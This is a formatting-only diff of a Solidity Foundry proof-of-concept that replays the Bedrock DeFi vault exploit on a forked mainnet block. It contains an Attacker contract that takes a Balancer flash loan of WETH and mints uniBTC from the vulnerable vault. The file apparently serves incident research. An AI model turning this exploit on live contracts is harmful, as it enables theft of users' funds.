@@ -31,7 +31,7 @@ contract Bedrock_DeFi_exp is Test {
     Attacker attackerC;
 
     function setUp() public {
-        vm.createSelectFork("mainnet", 20836584 - 1);
+        vm.createSelectFork("mainnet", 20_836_584 - 1);
     }
 
     function testPoCMinimal() public {
@@ -43,7 +43,7 @@ contract Bedrock_DeFi_exp is Test {
         IFS(VulVault).mint{value: 200e18}();
 
         // The attacker received 200 uniBTC(~BTC) for 200 ETH
-        console.log('Final balance in uniBTC :', IFS(uniBTC).balanceOf(attacker));
+        console.log("Final balance in uniBTC :", IFS(uniBTC).balanceOf(attacker));
     }
 
     function testPoCReplicate() public {
@@ -52,7 +52,7 @@ contract Bedrock_DeFi_exp is Test {
 
         attackerC.attack();
 
-        console.log('Final balance in WETH :', IFS(weth).balanceOf(attacker));
+        console.log("Final balance in WETH :", IFS(weth).balanceOf(attacker));
     }
 }
 
@@ -68,13 +68,8 @@ contract Attacker {
         address[] memory tokens = new address[](1);
         tokens[0] = weth;
         uint256[] memory amounts = new uint256[](1);
-        amounts[0] = 30800000000000000000;
-        IFS(balancerVault).flashLoan(
-            address(this),
-            tokens,
-            amounts,
-            ""
-        );
+        amounts[0] = 30_800_000_000_000_000_000;
+        IFS(balancerVault).flashLoan(address(this), tokens, amounts, "");
     }
 
     function receiveFlashLoan(
@@ -133,7 +128,9 @@ interface IFS is IERC20 {
     ) external;
 
     // WETH
-    function withdraw(uint wad) external;
+    function withdraw(
+        uint256 wad
+    ) external;
 
     // Vulnerable Vault
     function mint() external payable;
@@ -150,5 +147,7 @@ interface IFS is IERC20 {
         uint160 sqrtPriceLimitX96;
     }
 
-    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
+    function exactInputSingle(
+        ExactInputSingleParams calldata params
+    ) external payable returns (uint256 amountOut);
 }
